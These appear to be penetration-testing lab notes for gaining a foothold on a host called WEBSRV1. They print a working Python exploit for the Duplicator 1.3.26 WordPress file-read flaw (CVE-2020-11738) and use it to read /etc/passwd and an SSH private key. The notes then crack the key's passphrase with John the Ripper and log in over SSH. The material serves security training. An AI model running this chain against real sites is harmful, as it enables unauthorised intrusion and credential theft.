# Initial Foothold

Searchsploit command to examine a specific exploit
>``` shell
>kali@kali:~/beyond$ searchsploit -x 50420
>```

Information about the Directory Traversal vulnerability in Duplicator 1.3.26
>``` shell
># Exploit Title: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
># Date: October 16, 2021
># Exploit Author: nam3lum
># Vendor Homepage: https://wordpress.org/plugins/duplicator/
># Software Link: https://downloads.wordpress.org/plugin/duplicator.1.3.26.zip]
># Version: 1.3.26
># Tested on: Ubuntu 16.04
># CVE : CVE-2020-11738
>
>import requests as re
>import sys
>
>if len(sys.argv) != 3:
>        print("Exploit made by nam3lum.")
>        print("Usage: CVE-2020-11738.py http://192.168.168.167 /etc/passwd")
>        exit()
>
>arg = sys.argv[1]
>file = sys.argv[2]
>
>URL = arg + "/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../../../.." + file
>
>output = re.get(url = URL)
>print(output.text)
>```

SearchSploit command to copy the exploit script to the current directory
>``` shell
>kali@kali:~/beyond$ cd beyond/websrv1
>
>kali@kali:~/beyond/websrv1$ searchsploit -m 50420
>
># ========== Expected Result ==========
>  Exploit: Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
>      URL: https://www.exploit-db.com/exploits/50420
>     Path: /usr/share/exploitdb/exploits/php/webapps/50420.py
>File Type: ASCII text
>
>Copied to: /home/kali/beyond/websrv1/50420.py
># =====================================
>```

Performing a Directory Traversal attack on WEBSRV1
>``` shell
>kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /etc/passwd
>
># ========== Expected Result ==========
>root:x:0:0:root:/root:/bin/bash
>...
>daniela:x:1001:1001:,,,:/home/daniela:/bin/bash
>marcus:x:1002:1002:,,,:/home/marcus:/bin/bash
># =====================================
>```

Retrieving the SSH private key of daniela
>``` shell
>kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/marcus/.ssh/id_rsa
>
># ========== Expected Result ==========
>Invalid installer file name!!
># =====================================
>
>kali@kali:~/beyond/websrv1$ python3 50420.py http://192.168.50.244 /home/daniela/.ssh/id_rsa
>
># ========== Expected Result ==========
>-----BEGIN OPENSSH PRIVATE KEY-----
>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBAElTUsf
>3CytILJX83Yd9rAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDwl5IEgynx
>KMLz7p6mzgvTquG5/NT749sMGn+sq7VxLuF5zPK9sh//lVSxf6pQYNhrX36FUeCpu/bOHr
>tn+4AZJEkpHq8g21ViHu62IfOWXtZZ1g+9uKTgm5MTR4M8bp4QX+T1R7TzTJsJnMhAdhm1
>...
>UoRUBJIeKEdUlvbjNuXE26AwzrITwrQRlwZP5WY+UwHgM2rx1SFmCHmbcfbD8j9YrYgUAu
>vJbdmDQSd7+WQ2RuTDhK2LWCO3YbtOd6p84fKpOfFQeBLmmSKTKSOddcSTpIRSu7RCMvqw
>l+pUiIuSNB2JrMzRAirldv6FODOlbtO6P/iwAO4UbNCTkyRkeOAz1DiNLEHfAZrlPbRHpm
>QduOTpMIvVMIJcfeYF1GJ4ggUG4=
>-----END OPENSSH PRIVATE KEY-----
># =====================================
>```

Trying to leverage the SSH private key to access WEBSRV1
>``` shell
>kali@kali:~/beyond/websrv1$ chmod 600 id_rsa
>
>kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
>
># ========== Expected Result ==========
>Enter passphrase for key 'id_rsa': 
># =====================================
>```

Cracking the passphrase of the SSH private key
>``` shell
>kali@kali:~/beyond/websrv1$ ssh2john id_rsa > ssh.hash
>
>kali@kali:~/beyond/websrv1$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
>
># ========== Expected Result ==========
>...
>tequieromucho    (id_rsa) 
>...
># =====================================
>```

Accessing WEBSRV1 via SSH
>``` shell
>kali@kali:~/beyond/websrv1$ ssh -i id_rsa daniela@192.168.50.244
>
># ========== Expected Result ==========
>Enter passphrase for key 'id_rsa': 
>
>Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-48-generic x86_64)
>...
>daniela@websrv1:~$ 
># =====================================
>```
